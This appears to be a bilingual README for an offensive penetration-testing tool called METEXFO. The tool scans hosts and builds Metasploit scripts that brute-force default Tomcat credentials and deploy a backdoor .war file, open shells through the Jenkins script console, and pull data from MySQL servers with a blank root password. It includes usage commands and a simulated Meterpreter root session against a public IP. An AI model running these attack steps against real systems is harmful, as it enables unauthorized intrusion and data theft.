
# 💀 METEXFO v5.0

<p align="center">
<img src="https://shields.io">
<img src="https://shields.io">
<img src="https://shields.io">
<img src="https://shields.io">
</p>
<p align="center">
  <img src="https://hizliresim.com" width="600" alt="METEXFO Banner">
</p>

<p align="center">
<i>VERSION 5.0 METEXFO - GHOST0X02</i>
</p>

<p align="center">
  <a href="#-türkçe-dökümantasyon"><b>🇹🇷 Türkçe</b></a> | 
  <a href="#-english-documentation"><b>🇺🇸 English</b></a>
</p>

---

## 🇹🇷 Türkçe Dökümantasyon

### 🌌 Genel Bakış & Çalışma Mantığı
METEXFO v5.0, sızma testi süreçlerinde hedef sistemlerin en zayıf halkası olan **insan kaynaklı yapılandırma hatalarını (Misconfigurations)** ve **açık yönetim panellerini** avlamak için geliştirilmiş çift dilli, çoklu iş parçacıklı (Multi-threading) bir otomasyon aracıdır. 

Yazılım karmaşık exploitler denemek yerine şu adımlarla çalışır:
1. **Keşif (Nmap Altyapısı):** Belirtilen hedeflerin kritik portlarını (`21, 80, 443, 3306, 8080`) arka planda sessizce tarar ve çalışan servislerin versiyon bilgilerini ayıklar.
2. **Akıllı Eşleştirme (Logic Engine):** Bulunan servislere göre (HTTP veya MySQL) kendi yerleşik şablon veritabanını tarar.
3. **Mühimmat Hazırlığı (RC Derleyici):** Hedef sisteme yönelik en uygun Metasploit modüllerini otomatik olarak diler ve tetiğe basılmaya hazır bir `.rc` (Resource) saldırı planı oluşturur.

### 💀 Sızma Yolları ve Neler Yapabilir?
* **Apache Tomcat (Port 8080):** Sunucu yöneticilerinin değiştirmeyi unuttuğu varsayılan şifreleri (`admin:admin`, `tomcat:tomcat`) brute-force ile kırarak paneli ele geçirir. İçeriye `.war` uzantılı bir backdoor yükleyerek uzak kod çalıştırma (RCE) sağlar.
* **Jenkins Sunucusu (Port 80/443):** Dış dünyaya şifresiz veya açık unutulmuş otomasyon panellerini yakalar. Jenkins Script Console üzerinden doğrudan hedef işletim sisteminin komut satırına sızar.
* **MySQL Veritabanı (Port 3306):** En yetkili kullanıcı olan `root` hesabının şifresiz (boş parola) bırakıldığı senaryoları yakalar. Veritabanındaki tüm kullanıcı şifrelerini, tabloları ve ticari sırları dışarı sızdırabilir.

### 🚀 Kullanım
```bash
# Kurulum ve Bağımlılıklar
git clone https://github.com
cd METEXFO
pip3 install python-nmap colorama

# 1. Aşama: Keşif ve Reçete Üretimi
python3 mme12.py -t <HEDEF_IP> -l <KENDİ_IP> --lang tr

# 2. Aşama: Otomatik Saldırıyı Tetikleme
msfconsole -q -r metexfo_final_agent.rc
```

### ⚡ Hack İşlemi Başarılı Olursa Gelecek Olan Terminal Çıktısı (Öngörüm)
Eğer üretilen `.rc` dosyası çalıştırıldığında hedef sunucu zayıf yapılandırma nedeniyle düşerse, terminal ekranında açılacak olan o gerçekçi **Meterpreter** oturumu ve sızma anı çıktısı şu şekilde olacaktır:

```text
resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
resource (metexfo_final_agent.rc)> set RHOSTS 193.255.45.112
resource (metexfo_final_agent.rc)> set RPORT 8080
resource (metexfo_final_agent.rc)> run
[+] http://193.255.45 - Tomcat Manager LOGIN SUCCESSFUL: tomcat:tomcat
[*] Auxiliary module execution completed

[*] Upgrading session to exploit/multi/http/tomcat_mgr_deploy...
[*] Sending stage (175641 bytes) to 193.255.45.112
[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)

meterpreter > sysinfo
Computer        : KURBAN-SERVER-01
OS              : Linux 5.15.0-72-generic (Ubuntu 22.04)
Architecture    : x64

meterpreter > getuid
Server username: root

meterpreter > _
```

---

## 🇺🇸 English Documentation

### 🌌 Overview & Working Logic
METEXFO v5.0 is a localized, multi-threaded security orchestrator designed for penetration testers to hunt down **human-error configuration flaws (Misconfigurations)** and **exposed management panels**. 

The automation pipeline operates as follows:
1. **Reconnaissance (Nmap Engine):** Silently audits target IPs across critical vectors (`21, 80, 443, 3306, 8080`) to extract precise service banner details.
2. **Template Matching:** Correlates running services directly with its inner vulnerability lookup database.
3. **Payload Construction (RC Compiler):** Generates ready-to-fire Metasploit resource macros (`.rc`) tailored exactly to the target's open doors.

### 💀 Vector Capabilities & Attack Vectors
* **Apache Tomcat (Port 8080):** Targets left-behind default manager credentials (`admin:admin`, `tomcat:tomcat`). Once authenticated, it enables Remote Code Execution (RCE) by deploying a malicious `.war` archive.
* **Jenkins Orchestrator (Port 80/443):** Detects unauthenticated or legacy continuous integration setups. Leverages the build-in script terminal to spawn system shells.
* **MySQL Database (Port 3306):** Checks for blank `root` administration credentials. Allows total data exfiltration including password lists, tables, and credentials.

### 🚀 Usage
```bash
# Clone & Requirements
git clone https://github.com
cd METEXFO
pip3 install python-nmap colorama

# Phase 1: Recon & RC Blueprint Generation
python3 mme12.py -t <TARGET_IP> -l <YOUR_LHOST> --lang en

# Phase 2: Fire the Automation via Metasploit
msfconsole -q -r metexfo_final_agent.rc
```

### ⚡ Post-Exploitation Terminal Output Preview (Success Simulation)
When the compiled blueprint runs against an unhardened architecture and compromises the host, your terminal will immediately lock into an active **Meterpreter shell** as simulated below:

```text
resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
resource (metexfo_final_agent.rc)> set RHOSTS 193.255.45.112
resource (metexfo_final_agent.rc)> set RPORT 8080
resource (metexfo_final_agent.rc)> run
[+] http://193.255.45 - Tomcat Manager LOGIN SUCCESSFUL: tomcat:tomcat
[*] Auxiliary module execution completed

[*] Upgrading session to exploit/multi/http/tomcat_mgr_deploy...
[*] Sending stage (175641 bytes) to 193.255.45.112
[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)

meterpreter > sysinfo
Computer        : VICTIM-SERVER-01
OS              : Linux 5.15.0-72-generic (Ubuntu 22.04)
Architecture    : x64

meterpreter > getuid
Server username: root

meterpreter > _
```

---

## ⚖️ Yasal Uyarı / Disclaimer
**TR:** Bu araç yalnızca yasal sızma testleri ve eğitim faaliyetleri amacıyla geliştirilmiştir. İzin alınmamış hedef sistemler üzerinde kullanılması yasal sorumluluk doğurabilir. Kullanıcı, aracın kullanımından doğabilecek tüm hukuki sonuçlardan kendisi sorumludur.

**EN:** This software is strictly developed for authorized penetration testing, security auditing, and educational practices. Unauthorized deployment against remote infrastructure is highly illegal and carries strict judicial consequences.

**Developer:** `GHOST0X02` | **Version:** `5.0-Elite`
